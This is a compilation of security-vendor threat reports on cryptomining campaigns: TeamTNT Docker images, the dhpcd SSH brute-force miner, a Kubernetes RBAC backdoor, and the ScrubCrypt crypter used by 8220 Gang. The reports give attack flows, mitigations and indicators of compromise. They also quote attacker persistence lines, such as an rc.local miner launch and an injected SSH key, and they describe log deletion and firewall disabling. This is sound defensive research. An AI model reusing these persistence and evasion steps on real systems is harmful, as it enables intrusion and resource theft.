+The father is responsible for deciphering messages and writing it back to the
+child on the PIPE. 
+The child receives commands which are being executed by /bin/sh. 
+This leads us to conclude that the Bioset is serving as a bind shell that
+probably allows the attacker to connect to the host after he deployed the
+container.
+Discovery and Command and control:
+Using a web service (iplogger[.]org) to transmit collected data to the attacker
+during the discovery process, for instance, the number of cores in the CPU, its
+speed, system details (using uname -a), and targeted host IP address. 
+Logging the activity and encoding it into files (using Base64).
+5/9
+Defense Evasion:
+Deleting command history. 
+Deleting the shell file. 
+The script - 'sxc.sh’: 
+Downloading xmrig from a remote source.
+Writing the configuration file to disk (/usr/bin/ntpd.pid).
+Verifying that the Cryptominer (the file ntpd) is running.
+Terminating competition on resources:
+Stopping all Moneroocean processes.
+Optimizing the miner’s operation:
+Stopping monitoring services that limit the mining resources, such as
+system-getty.slices.service.
+Stopping system health services, such as cp.syshealt. 
+Discovery and Command and control:
+Using a web service (iplogger[.]org)   to transmit collected data to the
+attacker relevant to the mining processes, for instance, Monero hash
+rate, system details (using uname -a), and targeted host IP address. 
+Logging the activity and encoding it into files (using Base64).
+Defense Evasion Techniques:
+Removing system logs (/var/log/syslog).
+Deleting command history. 
+Deleting the shell file.
+Disabling network configuration, security, and monitoring tools, such as
+netfilter firewall, iptables, kernel.nmi_watchdog (responsible to check if
+the kernel is hung).
+Disabling security scanners, such as Aliyun. 
+The malicious binaries:
+SystemHealt - cb782b40757d1aba7a3ab7db57b50847 (MD5)
+AVscan - b27eb2159c808f844d60900e2c81a4df (MD5)
+The modus operandi
+The more sophisticated attacks contained various changes in the code, implying that
+TeamTNT invested time and effort to improve their attacks. They added defense evasion
+techniques and attempted to conceal the communication with their C2 servers to try and
+ensure success while making the attacks last longer.
+Examples of evasion techniques:
+Using dynamic code. The communication channels (IPs/domains) are defined as
+variables and use external configuration files to hide their C2 and mining
+infrastructure.
+6/9
+Leveraging web services and TOR servers to increase the persistence of their C2
+infrastructure.
+Putting more emphasis on OPSEC. Many stages, in recent attacks, revealed
+adversaries have been trying to cover their tracks by deleting their malicious tools,
+logs, erasing user activity on the host, etc.
+Using a private domain teamtnt[.]red with subdomains vps and pool.
+Disabling security tools and network security tools.
+Encoding many snippets with base64 (the same snippet may be encoded multiple
+times).
+To sum it up
+Over four months, TeamTNT uploaded various images, with some being used to perform
+attacks in the wild. This is still an active campaign targeting cloud native environments in
+general and misconfigured Docker API ports in particular. The newer images in these
+accounts were designed to use advanced malicious methods, such as defense evasion,
+lateral movement, and discovery techniques.
+We believe changes in these newer images somewhat reflect the learning curve
+(developing capabilities) of TeamTNT. The simpler and more straightforward images
+could be detected by static malware analysis, but the newer ones are too smart for that. In
+fact, the image xmrigminer can only be identified as malicious using behavioral profiling
+and monitoring in runtime, or better yet, in the pipeline using Aqua’s Dynamic Threat
+Analysis.
+Applying MITRE ATT&CK Framework to the TeamTNT attacks
+Summary that maps each component of the attack to the corresponding MITRE ATT&CK
+framework and techniques category:
+7/9
+8/9
+Indications of Compromise (IOCs):
+Mining pools:
+vps[.]teamtnt[.]red[:]33331
+45[.]9[.]148[.]123[:]33331
+xmr[.]f2pool[.]com[:]13531
+47[.]101[.]30[.]124[:]13531
+xmr[.]bohemianpool[.]com[:]9000
+80[.]211[.]206[.]105[:]9000
+Malicious Binaries
+xmrigDeamon - d6e169d47a4bed78dffc184409994fbf (MD5)
+Bioset - 4206dbcf1c2bc80ea95ad64043aa024a (MD5)
+dns3 - b348abf1d17f7ba0001905e295b1f670 (MD5)
+xmrigMiner - 7c7b77bfb9b2e05a7a472e6e48745aeb (MD5)
+docker-update - ecf5c4e29490e33225182ef45e255d51 (MD5)
+dns (Tsunami malware) - b7ad755d71718f2adf3a6358eacd32a3 (MD5)
+64[watchdogd] - 8ffdba0c9708f153237aabb7d386d083 (MD5)
+64bioset - b8568c474fc342621f748a5e03f71667 (MD5)
+64tshd - 5f5599171bfb778a7c7483ffdec18408 (MD5)
+armbioset - 23812035114dbd56599694ed9b1712d2 (MD5)
+armdns - cfa007dc2d02da9a8873c761aa5a5c8c (MD5)
+armtshd - d46b96e9374ea6988836ddd1b7f964ee (MD5)
+tntscan - 4882879ffdac39219bef1146433ec54f (MD5)
+SystemHealt - cb782b40757d1aba7a3ab7db57b50847 (MD5)
+AVscan - b27eb2159c808f844d60900e2c81a4df (MD5)
+Roi Kol
+Roi is a Security Researcher at Aqua. His work focuses on researching threats in the cloud
+native world. When not at work, Roi is a B.A. student in Computer Science at the Open
+University. He also enjoys going out into nature and spending time with family and
+friends.
+Security Threats, Container Security
+9/9
+dhpcd: The Cryptominer That Hid for Four Years
+akamai.com/blog/security-research/dhpcd-cryptominer-hid-four-years
+Akamai blue wave
+Akamai Security Research
+October 26, 2022
+by Oryan De Paz
+Executive summary
+Akamai Security Research observed a long-running attack campaign, which we’ve
+dubbed “dhpcd.” The campaign targets Linux machines with SSH servers by brute
+forcing passwords and eventually runs a Monero cryptominer on those machines.
+The campaign was first identified by Akamai’s threat sensors network in April 2018,
+and it still remains active today.
+We have observed more than 2,200 attacks from over 800 unique source IPs on our
+threat sensors network since the first appearance, with a distinguishable peak in
+May 2022.
+As part of the attack chain, the attackers deploy multiple backdoors using password
+changes and adding an SSH key, execute numerous scripts to neutralize
+competitors, and use cron jobs and the rc.local file for persistence.
+Some of the cryptominer binary files are unfamiliar to other security vendors.
+The origins of the attackers' infrastructure are unknown as they operate behind Tor
+exit nodes. Some of those Tor exit nodes belong to universities, nonprofit
+organizations, cybersecurity companies, and so forth.
+The partial list of indicators of compromise (IOCs) is available in the appendix; a
+full list of IOCs and a detection script are available in our public repository.
+What is dhpcd?
+Because so much of the internet runs on Akamai’s infrastructure, we have an expansive
+view of what goes on, and finding new (or new-ish) malware is one of the results of this
+wide-ranging view. In April 2018, the cryptominer based off the open source XMRig,
+which we have named “dhpcd,” hit Akamai’s threat sensors for the first time and have
+remained active ever since. It’s not often we come across malware that has been flagged
+1/7
+and is still running for that long with relative consistency that hasn’t been discussed. This
+is because this cryptominer brute forces in, hides, and pulls reconnaissance for things that
+would detect it.
+The name comes from a difficult-to-detect play on the legitimate Linux daemon dhcpd: a
+process in charge of configuring the DHCP server running on the machine when it starts.
+This technique of letter swapping is heavily used for multiple attack vectors to evade
+detection, which was part of this malware’s success in remaining active for at least four
+years. It uses Tor exit nodes to hide, which makes it difficult, if not impossible, to track
+the attack origins. It then mines the privacy coin Monero. We were able to obtain the
+Monero wallets from the cryptominer binary files.
+It has gone through a few variations, which has contributed to its success in evading
+detection, not only locally on the infected machine, but also with security vendors and
+various threat intel feeds. In this blog post, we will explore the attack flow, mitigation, and
+the impact of the various deployments.
+Incident activity
+Since April 2018, our sensors have recorded over 2,200 incidents from more than 800
+unique IP addresses. These IP addresses primarily belonged to hosting and
+communications companies. However, there were also a significant number of IPs from
+universities and nonprofit organizations, which in effect, became the infrastructure to
+further the malware’s intended purpose. 
+In March 2022, we noticed a major version update of XMRig, the cryptominer on which
+dhpcd is based, from version 2.13.0 to 5.2.0. In tandem with this significant version
+update, we observed a large uptick in both scale and scope. Shortly after this, in May
+2022, we observed the highest peak of the year thus far. Although it wasn’t as high as the
+2021 peak, this illustrates the attackers’ desire to level up the potential gains from this
+particular malware in the future. It stands to reason we will be seeing more examples of
+this in the coming months.
+Campaign scope
+Since our first detection of dhpcd, we’ve had 2,215 attacks, spread over 843 different
+attacker IPs, averaging 2.6 attacks per IP. For each source IP, we observed a range of 1 to
+27 attacks.
+Of the 840 attacker IPs, approximately 80% were Tor exit nodes, making it nearly
+impossible to trace the threat actor behind the attack. Using Tor is an OPSEC best
+practice, on the attackers’ side; however, it means that organizations that use Tor take an
+2/7
+active part of dhpcd’s (and other campaigns’) propagation and malware distribution.
+Among the organizations we saw attacking Akamai’s sensors were machines belonging to
+U.S. universities, European nonprofit organizations, and others.
+Based on the number of Tor exit nodes in these countries, most of the attacker IPs are
+located in the United States and Europe. Most of the European attacks came from
+Germany and the Netherlands.
+Finance
+The attackers use multiple wallets to collect their cryptomining profits. We found 13
+unique Monero wallets hard-coded into the cryptominer binary files. In the process of
+monitoring these wallets, we found that each one contains an amount equivalent to $150
+—$160; after gaining this amount, the attackers probably “rotate” to another wallet.
+Considering this relatively low amount of balance that each wallet holds, we assume that
+the actual number of wallets is significantly higher. These low amounts are another
+example of this malware’s OPSEC: taking and keeping small amounts to reduce the
+chance of being noticed.
+The total profits we’ve calculated so far are approximately 85 mBTC, which is equivalent
+to about $2,000. But again, we assume there are more wallets in malware files we did not
+obtain, thus the actual gain is likely significantly higher.
+The attackers mined Monero coins (XMR) using the mining pool domains of
+minexmr[.]com, such as: sg97[.]minexmr[.]com, fr13[.]minexmr[.]com,
+us40[.]minexmr[.]com, etc. The full list is provided in our IOC repository.
+On August 19, these mining pools were closed and the attackers had to find another pool
+to use, so the current mining pool is pool[.]supportxmr[.]com:80.
+Attack flow
+Initial breach
+The attackers breach the target Linux machines running SSH servers by brute forcing
+passwords. Then, they download a dummy executable file to the bin folder using SCP. The
+dummy program simply writes “Hello, World” to the console – presumably to verify
+execution permissions. The file names are random alphanumeric strings of 26 characters;
+for example, /bin/cpuufcdmorv9crpa8h6wgh6iq2.
+Cryptominer
+3/7
+The attackers then downloads the cryptominer — a file named “dhpcd” — to the same
+directory over SCP. The miner searches for available mining pool servers over TCP port
+4444:
+fr14[.]minexmr[.]com
+ca61[.]minexmr[.]com
+sg97[.]minexmr[.]com
+fr13[.]minexmr[.]com
+us40[.]minexmr[.]com
+Persistence 
+The attackers can now take care of making the cryptominer persistent. They use several
+techniques to achieve this.
+They start by changing passwords for existing users on the system, such as root, admin,
+test, oracle, test1, ubuntu, and more. They protect their changes by modifying the
+attributes of /etc/shadow, a file that holds the hashed passwords in the system as well as
+their metadata. 
+The attackers add their SSH key to ~/.ssh/authorized_keys file, and turn it immutable.
+ ssh-rsa 
+AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E
+The attackers use cron — a job scheduler that sets commands and tasks to run periodically
+— to run the cryptominer every hour. As another living-off-the-land persistence tool, they
+download an /etc/rc.local script file that launches the cryptominer with every system
+boot:
+ /bin/dhpcd -o ca.minexmr.com:4444 -B >/dev/null 2>/dev/null exit 0 
+Neutralizing competitors' activity
+The attackers put effort in terminating other threat actors’ activity to maximize the
+machines resources, and consequently, maximize profits. For this purpose, they execute
+two scripts from the /dev/shm directory — /dev/shm/knrm and /dev/shm/r — but not
+before they verify execution permissions from this directory (again using the “Hello,
+World” program).
+The /dev/shm folder is a tmpfs file system; it keeps all of its files in virtual memory
+instead of on a persistent storage device. By saving and running scripts from /dev/shm,
+the malware leaves no traces of these files on the file system.
+4/7
+The Bash scripts eliminate competition thoroughly, and we’ll use /dev/shm/r to
+demonstrate how. The script starts by querying the top resource-consuming processes
+running on the system and terminates those that take up a lot of RAM to ensure more
+memory is available for its own activity. Then, it deletes cron files that are associated with
+other attack campaigns, such as XorDdos, Tsunami, and aliyun.one.
+ /etc/cron.hourly/gcc.sh 
+/etc/cron.hourly/cron.sh 
+/etc/cron.hourly/gcc4.sh/lib/libudev.so 
+The script deletes files associated with the previously mentioned (and other) malware
+campaigns.
+ /root/pty 
+/tmp/bash 
+/dev/shm/bash 
+/var/tmp/bash 
+/var/lock/bash 
+/var/run/bash 
+/bin/httpsd 
+/lib/udev/udev 
+/lib/udev/debug 
+/root/sysem 
+/root/systma 
+/etc/jourxlv 
+/tmp/sysem 
+/tmp/su 
+'/tmp/ddgs.*' 
+/root/pty10 
+/root/pty4 
+/root/xmr64 
+/usr/local/sbin/t 
+/usr/local/sbin/rsync 
+/etc/ceurnad 
+Additionally, it kills malware-related processes, such as Xm64, Ceurnad, /tmp/samba,
+and Sc64u, if those are running.
+To collect information on new or unknown competitors, the script runs the command atq
+to display the list of pending jobs, as well as the files in various system directories. After
+filtering out known file patterns (dump, docker, mount, etc.), the attacker is left with a list
+of files that are potentially rival malware.
+Detection and mitigation
+The use of SSH servers is very common. Also unfortunately common are SSH servers that
+run with high privileges and are accessed using basic passwords. SSH-targeting attacks
+such as dhpcd can be easily blocked by configuring SSH to work exclusively with private
+and public keys, while blocking all password-based login attempts.
+5/7
+To apply that, modify your SSH config file (/etc/ssh/sshd_config) to have the following
+two lines:
+PermitRootLogin no
+PasswordAuthentication no
+To block dhpcd’s cryptomining activity, consider blocking outgoing TCP port 4444, which
+has been used in a significant number of attack incidents we’ve observed. Also, block all
+connections to known mining pool domains. You can find those related to dhpcd in our
+IoC repository. 
+To detect whether your system is infected, run our detection script for locating dhpcd
+traces. 
+Final thoughts
+dhpcd is a cryptomining campaign that uses tried and true techniques: it spreads over
+SSH, runs a cryptominer based on the well-known XMRig, and uses known tactics to set
+up backdoors and eliminate competitors.
+This campaign does demonstrate better OPSEC than most attack campaigns we observe,
+by incorporating Tor into the infection pipeline. Using Tor prevents defenders from
+tracing the attack infrastructure and origins, making the whole operation more stable and
+resistant.
+The use of Tor represents a bit of a double-edged sword: Organizations use Tor to support
+anonymity, privacy, and security, but as a by-product, by installing exit nodes, they
+become part of the infection chain. Although not necessarily infected themselves, these
+organizations provide a mechanism that is used to spread the malware across the
+internet, helping the attackers stay anonymous and protected.
+dhpcd proves to us once again that even the most basic and simple attack campaigns —
+ones characterized by dictionary attacks performed for compromise and file names that
+have their letters swapped to reduce detection — still manage to infect networks and make
+profits. Moreover, these campaigns are developed and maintained to level up the scale
+and scope of potential gains. The simple tactics, tips, and procedures, however, suggest
+that even with basic protection measures, alert defenders can increase the security of their
+systems.
+Appendix: indicators of compromise 
+The following is a partial list of IOCs. Please find the complete list in our repository.
+File names
+6/7
+/bin/[a-z0-9]{26} (Hello World program)
+/bin/dhpcd
+Domains
+fr14[.]minexmr[.]com
+ca61[.]minexmr[.]com
+sg97[.]minexmr[.]com
+fr13[.]minexmr[.]com
+us40[.]minexmr[.]com
+pool[.]supportxmr[.]com
+File hashes
+eb808932714c9533962e129e61d84c29536497e62b2a7d89dce3376d882c6965
+e971fa0c392a9f43c37dccfdd4f8e6bc109e162716d9b206170f7bb133634ffd
+76005592ad7d8901c64a5cfbcdde589a960ba35c9672da6182d131cd67ae0c97
+2cca764d24212f8fc58780b9135740929f38b45bcd5fc82c4a2ff47e90890d06
+3ea8cc0977e5542053353bcf3e58de947dd727259369707a13a4d0c8f14b7486
+Follow us on Twitter
+Written by
+Akamai Security Research
+Akamai blue wave
+7/7
+blog.aquasec.com /leveraging-kubernetes-rbac-to-backdoor-clusters
+First-Ever Attack Leveraging Kubernetes RBAC to Backdoor
+Clusters
+Michael Katchinskiy ⋮ ⋮ 2023/4/21
+We have recently discovered the first-ever evidence that attackers are exploiting Kubernetes (K8s) Role-
+Based Access Control (RBAC) in the wild to create backdoors. The attackers also deployed DaemonSets
+to take over and hijack resources of the K8s clusters they attack. Our research suggests that this
+campaign is actively targeting at least 60 clusters in the wild.   
+This blog post is a part of a comprehensive study we conducted on misconfigured K8s clusters in the
+wild. Our research findings are significant as they shed light on the risks of misconfigurations and how
+even large organizations can overlook the importance of securing their clusters, leaving them vulnerable
+to potential disasters with just one mistake. 
+The Attack
+We have recorded and analyzed an attack on one of our K8s honeypots, which utilized the RBAC system
+to gain persistence. The attacker deployed containers using DaemonSets to run Monero cryptominers. 
+The initial access was gained via a misconfigured API server that allowed unauthenticated requests from
+anonymous users with privileges. The attacker sent a few HTTP requests to list secrets and then made
+two API requests to gain information about the cluster by listing the entities in the 'kube-system'
+namespace. Next, the attacker checked if the attack had already been deployed on this specific cluster
+by looking for a deployment named 'kube-controller'. 
+1/7
+The attacker also attempted to delete some existing deployments in various namespaces, including
+'kube-secure-fhgxtsjh', 'kube-secure-fhgxt', 'api-proxy', and 'worker-deployment'. We assume that the
+attacker was disabling legacy campaigns or competitors' campaigns to increase available CPU and
+reduce the chances of being discovered if the server was exhausted. 
+The most interesting part of this attack was when the attacker used RBAC to gain persistence. The
+attacker created a new ClusterRole with near admin-level privileges. Since it was a cluster role, it was not
+bound to a specific namespace. Next, the attacker created a 'ServiceAccount', 'kube-controller' in the
+'kube-system' namespace. Lastly, the attacker created a 'ClusterRoleBinding', binding the ClusterRole
+with the ServiceAccount to create a strong and inconspicuous persistence.  
+2/7
+Figure 1: ClusterRole created by the attacker with admin-like privileges  
+At this point, even if the anonymous user access is disabled, the attacker created persistence that allows
+further exploitation of the cluster. Additionally, while binding the 'cluster-admin' role to a new or suspicious
+user may set off alarms, the attacker created a clever way to blend in nicely with the API audit logs.
+Eventually, by setting this legitimate-looking ClusterRoleBinding 'system:controller:kube-controller', the
+attacker could persist under the radar without setting off any alarms. 
+As part of our environment, we exposed AWS access keys in various locations on the cluster. Later that
+day, we received a beacon indicating that the access keys were used by the attacker to try and gain
+further access to the target's cloud service provider account and leverage the attack to steal more
+resources, data, and get out of the specific scope of the k8s cluster. 
+The attacker then created a DaemonSet to deploy containers on all nodes with a single API request. The
+DaemonSet creation request object contained the container image 'kuberntesio/kube-controller:1.0.1',
+hosted on the public registry Docker Hub. The impact on the cluster was resource hijacking. 
+3/7
+Figure 2: Deploying a DaemonSet with the container image kuberntesio/kube-controller
+When inspecting the container image 'kuberntesio/kube-controller:1.0.1' on Docker Hub, we found that
+the container was pulled 14,399 times since it was uploaded five months ago, indicating that this
+campaign is widespread. We found another 60 exposed K8s clusters that had evidence of active attacks
+by this attacker – this proves how large-scale the campaign is. 
+The container ‘kuberntesio/kube-controller’ has 3 tags, we analyzed all of them. Inside each of the
+container images we found the binary kube-controller (MD5=2833c82055bf2d29c65cd9cf6684449a),
+which was detected in VirusTotal as a cryptominer. We also found on each of the container images the
+configuration file. The wallet address indicated that the attacker had already mined 5 XMR, and at this
+rate of mining, they could gain another 5 per year ($200 USD) from a single worker. 
+The container image named 'kuberntesio/kube-controller' is a case of typosquatting that impersonates the
+legitimate 'kubernetesio' account. It has amassed millions of pulls, despite having only a few dozen
+container images. The image also mimics the popular 'kube-controller-manager' container image, which
+is a critical component of the control plane, running within a Pod on every master node, responsible for
+detecting and responding to node failures. Essentially, it is a widely used K8s component that should
+4/7
+exist on the cluster and could deceive practitioners into thinking it is a legitimate deployment rather than a
+cryptominer. Since it is designed to run continuously, no one would question its presence. 
+Mapping the Attacks to the Microsoft threat matrix for
+Kubernetes 
+As a best practice, our team usually map the components of the attacks to the corresponding techniques
+of the MITRE ATT&CK framework. In this case, however, MITRE has yet to publish a framework for
+attacks against Kubernetes cluster. We utilized the threat matrix created by Microsoft, and added some
+new suggestions: 
+Summary and Mitigation
+We are naming this attack RBAC Buster – a new K8s attack aimed to exploit K8s API servers to create a
+ClusterRoleBinding and gain full access to the cluster with persistence after the misconfiguration is fixed.
+To help mitigate such attacks, you can use Aqua Trivy to secure your K8s clusters. Trivy can help to find
+vulnerabilities, exposed secrets and misconfigurations.  
+Additionally, Aqua’s CNAPP is designed to detect such misconfigurations and protect your K8s clusters. 
+5/7
+Subscribe for Security Alerts
+Learn about discovered new vulnerabilities, threats, and attacks that target containers, Kubernetes,
+serverless, and public cloud infrastructure
+Thanks! Stay tuned for updates
+Michael Katchinskiy
+Michael is a Security Researcher at Aqua. As part of the Aqua research team, his work focuses on
+researching vulnerabilities in the cloud native ecosystem. When he isn't at work, he enjoys a good kite-
+surfing session and watching a good movie.
+Assaf Morag
+Assaf is a Lead Data Analyst at Aqua Nautilus research team, he focuses on supporting the data needs
+of the team, obtaining threat intelligence and helping Aqua and the industry stay at the forefront of new
+threats and methodologies for protection. His work has been published in leading info security
+publications and journals across the globe, and most recently he contributed to the new MITRE ATT&CK
+Container Framework.
+Security Threats, Kubernetes Security, Kubernetes RBAC
+6/7
+7/7
+www.fortinet.com /blog/threat-research/old-cyber-gang-uses-new-crypter-scrubcrypt
+Old Cyber Gang Uses New Crypter – ScrubCrypt
+⋮ 2023/3/8
+1/16
+FortiGuard Labs Threat Research
+By Cara Lin | March 08, 2023
+Affected platforms: Windows
+Impacted parties: Any organization
+Impact: Cryptojacks vulnerable systems
+Severity level: Critical
+Between January and February 2023, FortiGuard Labs observed a payload targeting an exploitable Oracle Weblogic
+Server in a specific URI. This payload extracts ScrubCrypt, which obfuscates and encrypts applications and makes
+them able to dodge security programs. It already has an updated version, and the seller’s webpage (Figure 1)
+guarantees that it can bypass Windows Defender and provide anti-debug and some bypass functions.
+We analyzed the malware injected into a victim’s system and, as part of our analysis, identified the threat actor as
+8220 Gang using collected indicators. This mining group first appeared in 2017. The name “8220” comes from its
+original use of port 8220 for network communications.
+In this article, we will elaborate on the details of ScrubCrypt and other malware delivered by this crypter in the past.
+2/16
+the Web
+Initial access
+ Figure 1: ScrubCrypt for sale on
+Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and
+185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, “wls-wsat/CoordinatorPortType,” which belongs to an
+Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2.
+Figure 2: Attacking traffic capture
+The attack attempts to download a PowerShell named “bypass.ps1”. The partial PowerShell script, “bypass.ps1,”
+shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions.
+After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first
+variable, “$c”, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the
+variables, from “$d” to “$f”, are for AMSI and ETW evasion, which is executed by “iex” at the end of the attack.
+3/16
+Figure 3: Partial code of “bypass.ps1”
+After decoding “$c”, we find the script for the next step, shown in Figure 4. It has another Base64-encoded code
+saved in the victim’s temp folder with the filename “OracleUpdate.bat” to masquerade as a normal system file. Once
+the fake “update” file is decoded and saved, it executes with the Windows style “hidden” to silently load ScrubCrypt.
+Figure 4: Code to create “OracleUpdate.bat”
+Technical analysis – the ScrubCrypt .BAT file
+ScrubCrypt is a crypter used to secure applications with a unique BAT packing method. The batch file is shown in
+Figure 5. The encrypted data at the top can be split into four parts using backslash “\”. The final two parts are the key
+and iv for AES CBC decryption.
+After Base64 decode, AES decryption, and unzip, we can finally see the code. The organized code in Figure 6 is a
+typical .NET Reflective Injection. In the last two lines of the code, the variable “$BmoFi” disables Event Tracing for
+Windows (ETW) by patching the EtwEventWrite function with 0xC3 (ret), and “$BbIpF” is used to invoke a .NET
+named “ScrubCrypt” for the final payload, shown in Figure 7.
+4/16
+Figure 5: Batch file of ScrubCrypt
+Figure 6: Organized Code
+5/16
+Figure 7: .NET code of ScrubCrypt
+Technical analysis – the ScrubCrypt .NET file
+The .NET code first modifies the extension as null, checks to see if a debugger is attached, and checks the system’s
+operating system version to decide whether or not to proceed. It then gets the process ID to establish a melting file
+(self-delete) after execution, shown in Figure 8.
+Figure 8 PowerShell for self-delete
+Then, it determines whether the current user belongs to the Windows user group “BUILTIN\Administrators” (RID:
+0x220). If the user is not in that specific group, it decodes the “UAC” data from the “Resources” section and saves it
+to “C:\Windows\system32\perfmon.exe”. The DLL file is shown in Figure 9. It is used to retrieve username information
+from the compromised endpoint. It then decodes the PowerShell command: “cmd /c timeout /t 3 /nobreak &
+“C:\Windows\System32\perfmon.exe”” to pause the command processor for three seconds, ignore any keystrokes,
+and execute the DLL.
+6/16
+Figure 9 DLL file for retrieving username
+Next, it enumerates the driver in the system to bypass scans from Windows Defender using the command in Figure
+10.
+Figure 10 Modifying settings for Windows Defender
+For persistence, it grabs registry values from “Run” and “RunOnce” to determine if this .NET file is already set. If not,
+it saves the .NET file to a “Roaming” folder named “BSLkE.bat” and adds a registry value to run a VBS file with the
+content shown in Figure 11.
+7/16
+Figure 11 Addition to the registry for persistence
+Finally, it decodes data “P” from the “Resources” section using the XOR key in Figure 12 and unzips it. Then it loads
+the decoded data named “miner” in memory and invokes the payload, as shown in Figure 13.
+Figure 12 XOR key used to decode the final payload
+8/16
+Figure 13 Final payload in memory
+Technical analysis – final payload
+We collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt
+loads “miner” and invokes the process “explorer.exe” to start the miner process to server 45[.]142[.]122[.]11:8080,
+shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023.
+9/16
+Figure 14: Payload from ScrubCrypt on 2/14
+Figure 15 Traffic capture from crypto miner on 2/14
+On 2/15, ScrubCrypt extracted “bat”, which unzipped its array data and used “InvokeMember” to execute
+“Eoengmvsg.dll”, shown in Figure 16. It decodes the three C2 servers and three port numbers shown in Figure 17.  
+10/16
+Figure 16: Payload from ScrubCrypt on 2/15
+Figure 17 C2 Server and port number
+Once that victim device receives the C2 server’s packets, it downloads another three files from 79[.]137[.]203[.]156,
+shown in Figure 18. The first, “miner.bat”, is a ScrubCrypt BAT file. The other two files are compressed PE files:
+“plugin_3.dll” and “plugin_4.dll” (Figure 19). They exhibit behavior similar to that described in this previous article.
+11/16
+Figure 18 Downloaded files from 79[.]137[.]203[.]156
+Figure 19 Decoded file "plugin_3.dll" and "plugin_4.dll"
+On 2/16, ScrubCrypt loaded a module also named “bat’, as shown in Figure 20, but the data for its unzip is from its
+“Resources” section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210.
+These files are also compressed PE files named “plugin_3.dll” and “plugin_4.dll”. They are identical to the files from
+2/15 and start crypto miner activity using the same configuration, as shown in Figure 21.
+12/16
+Figure 20: Payload from ScrubCrypt on 2/16
+ Figure 21 Traffic capture from
+crypto miner on 2/16
+The crypto wallet address,
+46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4
+and the server IP address used in Monero miner have all been used by the 8220 Gang in the past. It’s why we
+believe the whole attack was launched by this threat actor, although the port number used is no longer 8220.
+Conclusion
+8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system
+vulnerabilities to infiltrate a victim’s environment. Within a very short time, it has evolved to use a newer crypter
+variant, “ScrubCrypt.” Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions,
+making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter
+and keep their systems patched.
+13/16
+Fortinet Protections
+The malware described in this report are detected and blocked by FortiGuard Antivirus as:
+ Figure 22 The Attack Chain
+PowerShell/Agent.YX!tr
+BAT/ScrubCrypt.A!tr
+MSIL/ScrubCrypt.AHRI!tr
+MSIL/Agent.DUD!tr
+MSIL/Agent.AHZU!tr
+MSIL/GenKryptik.FYKQ!tr
+MSIL/GenKryptik.GGHT!tr
+MSIL/Agent.OBB!tr.dldr
+Riskware/CoinMiner
+The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet
+AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected.
+The FortiGuard Web Filtering Service blocks the malicious URL and IP address.
+If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard
+Incident Response Team.
+IOCs
+URLs:
+su-95[.]letmaker[.]top
+work[.]letmaker[.]top
+IP Address:
+14/16
+163[.]123[.]142[.]210
+185[.]17[.]0[.]19
+79[.]137[.]203[.]156
+209[.]141[.]38[.]219
+45[.]142[.]122[.]11
+179[.]43[.]155[.]202
+Files:
+d9e7d3dbb299f76bb8a84e3b72cc8e78e86ea90e2dc777cdcfd51dbd10657f47
+179be54b3c2e29571fec9dcd16781eee3ce997c5352d9cce4834a10fc11d636b
+20a8278b25d5c27e861dc5188f9ffd40fc45db4131245ce1020c6fa9909841d1
+3422e84ca8e1ce5b106415d074667721772a7a8e9de3cd911665bad42145926c
+a9d0af5af4cebbcce59ad5ef823a8d0ec71147799692c03be784f9e1670467ca
+84f8580343323b8534d2321c1b8789df544c4941e12d8dfa5a1fbcd201b97e72
+15cc89335d137fde5c61e540cd1c77718653ed7f359b206aeb85f25e5928096a
+57223450820cbe9cf5779083b7d85c440bb8b529505c55579bfcc5816bf5c80a
+9e2ddef83a3043de6a1f655a556fe3eca522656ad5e6056dd92ad13fa354b32f
+4d3be48fd3dde635cccd87a9925749c5a166e9b52026b5277883c7f3ab50c520
+55ba36d2ee2c5359dec3a425d27df9c3fb1ddede8cef74fd0bd69d38434609fd
+2ad4c954313fe912a64c4116bf7ec5cbd2e6e3a88979f7b7c2863ca21ffc9dd9
+0159c3b4fdff4ba89ff9e56bf2cdcdc8aaaa35d1fa4661288225e3701f8569b5
+b3ceead8490dd68c344d5b009a8bf17ed7d24499a9d66dc3493033b5696f6632
+13a11140bc0c62fbc8a364f71dfdf91a3ef321bb8c9c212b3af5eb576488a95e
+0767cfa1fb304ba5ef61d25ddc580cf82170b84e6a04c856e84c6ad3ad98dc92
+922c114c3a7f69b3210624f3e267cfc330969d17c5813cd328557b1476ef1858
+21326ecbb4cf7fef735e04f8e51efd7c861f883844e22050eab8615c7605b2f5
+e6834bbc9946e79f8888d30e52ae72552c37f160a8e6ce3f56ae5a88ed190e91
+d6150fd4d9616788fcb6f765ab5052669feaf90ac926ad42a59f3abf4871edb8
+4e46e6ca8c993761238af82e33a98aee97e80a3c8c80d418fb410e9556788d97
+a12c34fef1d6475d99aa9af2e8bf1fd55bca83982a0ee2a9131ffd9fd15cb2a7
+b62ea075cfc99980488bc206cba24ffcd4faccd8b1a80aec27d9d444c430095d
+283db6a012cb9183f45674cb43303fa9b6c9a7ebab41c821dc0cc122ad3bb43
+Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard AI-
+powered security services portfolio.
+15/16
+Tags:
+threat research, oracle, malware analysis
+Copyright © 2023 Fortinet, Inc. All Rights Reserved
+Terms of ServicesPrivacy Policy
+| Cookie Settings
+16/16
+www.fortinet.com /blog/threat-research/rapperbot-ddos-botnet-expands-into-cryptojacking
+RapperBot DDoS Botnet Expands into Cryptojacking
+⋮ 2023/5/10
